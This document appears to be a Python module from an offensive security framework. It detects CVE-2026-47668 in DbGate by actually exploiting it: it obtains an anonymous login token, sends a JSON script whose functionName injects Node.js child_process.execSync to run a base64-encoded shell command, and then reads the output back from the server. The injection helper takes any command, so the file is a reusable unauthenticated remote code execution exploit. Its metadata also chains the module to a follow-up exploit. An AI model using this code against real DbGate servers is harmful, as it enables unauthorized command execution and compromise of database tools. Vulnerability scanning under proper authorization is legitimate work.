#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Detect DbGate CVE-2026-47668 unauthenticated JSON script runner RCE."""

import base64
import time
import uuid

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.response_validation import parse_json_response


class Module(Scanner, Http_client):
    __info__ = {
        "name": "DbGate CVE-2026-47668 Script Runner RCE Detect",
        "description": (
            "Detects CVE-2026-47668 in DbGate <= 7.1.8: POST /runners/start transpiles JSON "
            "scripts with raw functionName concatenation after dbgateApi., enabling Node.js "
            "code injection without run-shell-script permission. Anonymous auth often yields "
            "a JWT via POST /auth/login."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-47668"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-47668",
            "https://www.cve.org/CVERecord?id=CVE-2026-47668",
        ],
        "modules": ["exploits/multi/http/dbgate_cve_2026_47668_rce"],
        "tags": [
            "web",
            "scanner",
            "dbgate",
            "nodejs",
            "code-injection",
            "rce",
            "cve-2026-47668",
            "vuln",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe", "active_exploitation"],
            "expected_requests": 4,
            "reversible": True,
            "approval_required": True,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "cost": 1.0,
            "noise": 0.4,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["dbgate"],
                "endpoint_pattern_any": ["/runners/start"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "rce", "from_detail": "functionName injection"},
                ],
                "suggested_followups": [
                    "exploits/multi/http/dbgate_cve_2026_47668_rce",
                ],
            },
        },
    }

    port = OptPort(3000, "DbGate HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    poll_seconds = OptInteger(6, "Seconds to wait for out.txt probe output", False, advanced=True)

    def _api(self, suffix: str) -> str:
        base = (self.path or "/").rstrip("/")
        if not suffix.startswith("/"):
            suffix = f"/{suffix}"
        return f"{base}{suffix}" if base else suffix

    def _login_token(self):
        response = self.http_request(
            method="POST",
            path=self._api("/auth/login"),
            json={"amoid": "none"},
            session=True,
            allow_redirects=False,
            timeout=int(self.timeout or 15),
        )
        if not response:
            return ""
        body, err = parse_json_response(response)
        if err or not body:
            return ""
        for key in ("accessToken", "access_token", "token"):
            if body.get(key):
                return str(body[key])
        inner = body.get("data") or body.get("result")
        if isinstance(inner, dict):
            for key in ("accessToken", "access_token", "token"):
                if inner.get(key):
                    return str(inner[key])
        return ""

    def _auth_headers(self, token: str) -> dict:
        return {"Authorization": f"Bearer {token}"} if token else {}

    def _runner_body(self, command: str) -> dict:
        b64 = base64.b64encode(command.encode()).decode()
        node_js = (
            f"process.mainModule.require('child_process')"
            f'.execSync("echo {b64}|base64 -d|sh > out.txt 2>&1")'
        )
        return {
            "script": {
                "type": "json",
                "packageNames": [],
                "commands": [
                    {
                        "type": "assign",
                        "variableName": "x",
                        "functionName": f"x;{node_js};//",
                        "props": {},
                    }
                ],
            }
        }

    def run(self):
        marker = f"ALIM_{uuid.uuid4().hex[:12]}"
        probe_cmd = f"id; echo {marker}"
        token = self._login_token()

        start = self.http_request(
            method="POST",
            path=self._api("/runners/start"),
            json=self._runner_body(probe_cmd),
            headers=self._auth_headers(token),
            session=True,
            allow_redirects=False,
            timeout=int(self.timeout or 15),
        )
        if not start:
            return False

        code = int(start.status_code or 0)
        text = start.text or ""
        if code == 500 and "Invalid functionName" in text:
            print_status("CVE-2026-47668 patched (Invalid functionName)")
            return False
        if code == 401:
            print_status("CVE-2026-47668 anonymous auth disabled (HTTP 401)")
            return False

        body, err = parse_json_response(start)
        runid = (body or {}).get("runid") if not err else None
        if not runid:
            return False

        deadline = time.time() + int(self.poll_seconds or 6)
        while time.time() < deadline:
            fetch = self.http_request(
                method="GET",
                path=self._api(f"/runners/data/{runid}/out.txt"),
                headers=self._auth_headers(token),
                session=True,
                allow_redirects=False,
                timeout=int(self.timeout or 15),
            )
            if fetch and int(fetch.status_code or 0) == 200 and marker in (fetch.text or ""):
                reason = f"CVE-2026-47668: RCE via /runners/start (runid {runid})"
                print_status("CVE-2026-47668 vuln=True")
                self.set_info(
                    severity="critical",
                    reason=reason,
                    vulnerable=True,
                    cve="CVE-2026-47668",
                    path=self._api("/runners/start"),
                    runid=runid,
                )
                return True
            time.sleep(0.5)

        print_status(f"CVE-2026-47668 runid {runid} but no output — inconclusive")
        return False
